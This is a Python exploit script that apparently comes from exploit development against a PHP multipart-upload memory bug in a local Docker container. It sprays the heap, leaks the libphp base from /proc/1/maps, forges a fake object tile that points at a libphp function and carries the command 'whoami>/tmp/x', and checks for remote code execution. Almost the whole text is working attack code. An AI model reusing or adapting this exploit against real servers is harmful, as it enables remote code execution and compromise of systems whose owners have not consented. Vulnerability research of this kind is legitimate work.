#!/usr/bin/env python3
"""oom109: payload68's OWN weaponization — fat envelope + value_tile.

Everything tonight is explained by one fact: only the FAT envelope's
teardown walks deep enough to matter, and its walk reads ITS OWN
values region (not the sapi posts'). payload68 already supports this:
build_attack(k1, stamp, value_tile=tile) puts the tile in EVERY part
value of the FULL fat body (binary-safe, NUL-ok in values).

oom109: probe V -> OBJ (3-bit law) -> fat body with value_tile=legal
tile -> single post -> its own bailout walks its own values.
OBJ from probed V so the tile's OBJ lands inside the fat body's own
regions; BOFF chosen so block sits clear of the walk slot (~440-490).
"""
import struct, subprocess, time, re, urllib.request, urllib.error
import payload68

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(url, body, ctype=None, timeout=150):
    req = urllib.request.Request(HOST + url, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
MAXT = 1537
BOFF = 670

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)
    s = b"whoami>/tmp/x\x00"
    return hdr + s + b"\x00" * ((-(24 + len(s))) % 8)

def build_tile(OBJ, BOFF, V):
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)
    struct.pack_into("<II", B, 0x08, 1, 0)
    struct.pack_into("<Q",  B, 0x10, 0)
    struct.pack_into("<I",  B, 0x2C, 1)
    B[0x18:0x20] = struct.pack("<Q", OBJ + 0x90)
    B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)
    B[0x58:0x5C] = struct.pack("<I", 6)
    B[0x68:0x68 + 40] = gs_block()
    B[0x90:0xA0] = struct.pack("<QQ", 0, BASE + ZIF)
    T = bytearray(MAXT)
    grid = (8 - (V % 8)) % 8
    for off in range(grid, BOFF - 8, 8):
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = B
    for off in range(BOFF + TILE, MAXT - 8, 8):
        struct.pack_into("<Q", T, off, OBJ)
    return bytes(T)

def probe_copies(needle, maxc=12):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=%d" % (HOST + "/oom_probe.php", h, maxc), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            return [int(x, 16) for x in m.group(2).split()]
    return []

def find_obj(offs):
    for V in offs:
        for b in range(BOFF - 260, MAXT - TILE):
            x = V + b
            if (x & 0xF) == 8 and ((x >> 8) & 1) == 1 and ((x >> 9) & 1) == 0:
                return V, x, b
    return None, None, None

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

WARM = b"------X\r\nContent-Disposition: form-data; name=\"w\"; filename=\"" + b"a" * 1525 + b"\"\r\nContent-Type: text/plain\r\n\r\n" + (b"WARMUPX" * 192 + b"W" * 400)[:1537] + b"\r\n"
warm_body = WARM * 3400 + b"------X--\r\n"

for cyc in range(3):
    OUT("-- cycle %d --" % cyc)
    for i in range(12):
        post("/oom_sapi.php", warm_body)
    offs = probe_copies(b"WARMUPX" * 24, maxc=12)
    OUT("    copies=%s" % ([hex(o) for o in offs[:4]],))
    if not offs:
        continue
    V, OBJ, boff = find_obj(offs)
    OUT("    V=%s OBJ=%s BOFF=%d" % (hex(V) if V else None,
        hex(OBJ) if OBJ else None, boff))
    if not OBJ:
        continue
    tile = build_tile(OBJ, boff, V)
    body = payload68.build_attack(3400, 6200000 + cyc * 137, value_tile=tile)
    OUT("    fat+tile body: %d bytes" % len(body))
    code, resp = post("/oom_mod.php", body, ctype="multipart/form-data; boundary=BOUND")
    OUT("    fat: %s %r" % (code, resp[:40]))
    if check_x("fat"):
        raise SystemExit("*** RCE CONFIRMED ***")
    if code == "ERR":
        time.sleep(4)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
